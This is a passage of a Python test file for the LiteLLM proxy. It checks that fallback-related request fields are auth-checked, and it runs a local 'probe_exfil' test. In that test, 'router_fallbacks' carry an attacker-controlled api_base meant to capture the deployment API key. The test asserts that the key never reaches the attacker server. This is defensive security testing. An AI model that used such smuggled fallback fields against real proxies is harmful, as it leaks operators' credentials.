    from litellm.proxy.litellm_pre_call_utils import _UNTRUSTED_ROOT_CONTROL_FIELDS
    from litellm.proxy.route_llm_request import GATED_MOCK_PARAM_NAMES

    root = Path(litellm.__file__).parent
    modules = {
        "litellm.router": root / "router.py",
        "litellm.proxy.route_llm_request": root / "proxy" / "route_llm_request.py",
        "litellm.utils": root / "utils.py",
        "litellm.main": root / "main.py",
        "litellm.proxy.litellm_pre_call_utils": root / "proxy" / "litellm_pre_call_utils.py",
        "litellm.proxy.common_request_processing": root / "proxy" / "common_request_processing.py",
        "litellm.messages.dispatch": root / "messages" / "dispatch.py",
        **{
            f"litellm.router_utils.{path.stem}": path
            for path in (root / "router_utils").glob("*.py")
            if path.stem != "__init__"
        },
    }
    read = frozenset().union(*(_fallback_keys_read(name, path, importlib, ast) for name, path in modules.items()))
    stripped_router_state = frozenset({"fallback_depth", "fallback_model_group", "_mid_stream_fallback_controls"})
    caller_flags = frozenset({"disable_fallbacks", "_disable_fallbacks", "max_fallbacks", "include_fallback_errors"})
    not_a_kwarg = frozenset({"_ageneric_api_call_with_fallbacks"})
    hop_counters = frozenset({"attempted_fallbacks"})

    from litellm.proxy.auth import auth_utils

    auth_checked = frozenset(
        (*auth_utils._FALLBACK_FIELDS, getattr(auth_utils, "CONTEXT_WINDOW_FALLBACK_DICT_FIELD", ""))
    )
    assert stripped_router_state <= frozenset(_UNTRUSTED_ROOT_CONTROL_FIELDS)
    unchecked = read - auth_checked - stripped_router_state - caller_flags - not_a_kwarg - hop_counters
    assert unchecked - frozenset(GATED_MOCK_PARAM_NAMES) == frozenset()
    assert "router_fallbacks" in read


def _fallback_keys_read(module_name: str, path, importlib, ast) -> frozenset[str]:
    tree = ast.parse(path.read_text())

    def resolve(node) -> str | None:
        if isinstance(node, ast.Constant) and isinstance(node.value, str):
            return node.value
        if isinstance(node, ast.Name):
            value = getattr(importlib.import_module(module_name), node.id, None)
            return value if isinstance(value, str) else None
        return None

    def kwargs_key(node) -> str | None:
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute) and node.args:
            owner = node.func.value
            if node.func.attr in ("get", "pop", "setdefault") and isinstance(owner, ast.Name) and "kwargs" in owner.id:
                return resolve(node.args[0])
        if isinstance(node, ast.Subscript) and isinstance(node.value, ast.Name) and "kwargs" in node.value.id:
            return resolve(node.slice)
        return None

    def literal_keys(node) -> tuple[str | None, ...]:
        if isinstance(node, (ast.Tuple, ast.List, ast.Set)) and all(
            isinstance(element, (ast.Constant, ast.Name)) for element in node.elts
        ):
            return tuple(resolve(element) for element in node.elts)
        return ()

    module_constants = tuple(
        node.value.value
        for node in tree.body
        if isinstance(node, (ast.Assign, ast.AnnAssign))
        and isinstance(node.value, ast.Constant)
        and isinstance(node.value.value, str)
    )
    candidates = (
        *(kwargs_key(node) for node in ast.walk(tree)),
        *(key for node in ast.walk(tree) for key in literal_keys(node)),
        *module_constants,
    )
    return frozenset(key for key in candidates if isinstance(key, str) and "fallback" in key and key.isidentifier())


class _ProbeUpstream:
    """The probe's three real HTTP upstreams (gate780a probe_exfil.py): requested fails, other and attacker answer."""

    def __init__(self) -> None:
        import threading
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

        self.seen: list[tuple[str, str | None]] = []
        upstream = self

        class Handler(BaseHTTPRequestHandler):
            def do_POST(self) -> None:
                import json

                sent = json.loads(self.rfile.read(int(self.headers["content-length"])))
                name = self.server.upstream_name  # pyright: ignore[reportAttributeAccessIssue]  # set below
                upstream.seen.append((name, self.headers.get("x-api-key")))
                status = 500 if name == "requested" else 200
                reply = (
                    {"type": "error", "error": {"type": "api_error", "message": "mock outage"}}
                    if status == 500
                    else _messages_reply(sent.get("model", ""))
                )
                self.send_response(status)
                self.send_header("content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(reply).encode())

            def log_message(self, *args: object) -> None:
                pass

        self._servers = tuple(ThreadingHTTPServer(("127.0.0.1", 0), Handler) for _ in range(3))
        for server, name in zip(self._servers, ("requested", "other", "attacker")):
            server.upstream_name = name  # pyright: ignore[reportAttributeAccessIssue]  # read by the handler
            threading.Thread(target=server.serve_forever, daemon=True).start()
        self.requested, self.other, self.attacker = (f"http://127.0.0.1:{s.server_address[1]}" for s in self._servers)

    def close(self) -> None:
        for server in self._servers:
            server.shutdown()
            server.server_close()


@pytest.mark.asyncio
async def test_probe_exfil_router_fallbacks_api_base_never_gets_the_deployment_key(monkeypatch: pytest.MonkeyPatch):
    from unittest.mock import MagicMock as _MagicMock

    import litellm
    from litellm.proxy.auth.auth_utils import is_request_body_safe
    from litellm.proxy.litellm_pre_call_utils import add_litellm_data_to_request
    from litellm.proxy.route_llm_request import route_request

    upstream = _ProbeUpstream()
    try:
        monkeypatch.setattr(litellm, "disable_aiohttp_transport", True)
        router = Router(
            model_list=[
                {
                    "model_name": name,
                    "litellm_params": {
                        "model": f"anthropic/claude-{name}",
                        "api_key": _DEPLOYMENT_KEY,
                        "api_base": host,
                    },
                }
                for name, host in (("requested", upstream.requested), ("other", upstream.other))
            ],
            num_retries=0,
        )
        body = {
            "model": "requested",
            "messages": [{"role": "user", "content": "hi"}],
            "max_tokens": 5,
            "router_fallbacks": [{"model": "other", "api_base": upstream.attacker}],
        }
        for field in ("fallbacks", "router_fallbacks"):
            probe_body = {**{k: v for k, v in body.items() if k != "router_fallbacks"}, field: body["router_fallbacks"]}
            with pytest.raises(ValueError, match="api_base"):
                is_request_body_safe(request_body=probe_body, general_settings={}, llm_router=router, model="requested")

        request = _MagicMock(spec=Request)
        request.url = _MagicMock()
        request.url.path = "/v1/messages"
        request.url.__str__.return_value = "http://proxy.test/v1/messages"
        request.method = "POST"
        request.query_params = {}
        request.headers = {"anthropic-beta": _SERVER_SIDE_FALLBACK_BETA}
        request.client = _MagicMock()
        request.client.host = "127.0.0.1"
        data = await add_litellm_data_to_request(
            data=dict(body),
            request=request,
            user_api_key_dict=UserAPIKeyAuth(api_key="hashed-key"),
            proxy_config=_MagicMock(),
            general_settings={},
            version="test",
        )
        with pytest.raises(litellm.InternalServerError):
            await (await route_request(data=data, llm_router=router, user_model=None, route_type="anthropic_messages"))
    finally:
        upstream.close()

    assert upstream.seen == [("requested", _DEPLOYMENT_KEY)]
